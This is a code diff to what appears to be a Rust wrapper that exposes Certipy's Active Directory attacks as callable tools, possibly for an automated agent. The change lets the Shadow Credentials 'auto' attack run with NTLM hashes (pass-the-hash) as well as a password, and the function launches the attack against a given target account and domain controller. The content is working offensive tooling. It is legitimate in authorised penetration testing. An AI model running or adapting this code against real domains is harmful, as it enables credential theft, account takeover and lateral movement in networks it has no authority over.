@@ -119,13 +119,14 @@ pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
 
 /// Perform Certipy Shadow Credentials attack (auto mode).
 ///
-/// Required args: `username`, `domain`, `password`, `target`, `dc_ip`
+/// Required args: `username`, `domain`, `target`, `dc_ip`
+/// Required (one of): `password`, `hashes`
 pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
-    let password = required_str(args, "password")?;
     let target = required_str(args, "target")?;
     let dc_ip = required_str(args, "dc_ip")?;
+    let hashes = optional_str(args, "hashes");
 
     let user_at_domain = format!("{username}@{domain}");
 
@@ -150,17 +151,23 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
         .output()
         .await;
 
-    CommandBuilder::new("certipy")
+    let mut cmd = CommandBuilder::new("certipy")
         .arg("shadow")
         .arg("auto")
         .flag("-username", user_at_domain)
-        .flag("-password", password)
         .flag("-account", target)
         .flag("-dc-ip", dc_ip)
         .flag("-out", out)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120);
+
+    if let Some(h) = hashes {
+        cmd = cmd.flag("-hashes", h);
+    } else {
+        let password = required_str(args, "password")?;
+        cmd = cmd.flag("-password", password);
+    }
+
+    cmd.execute().await
 }
 
 /// Certipy CA management operations (add-officer, issue-request, backup).
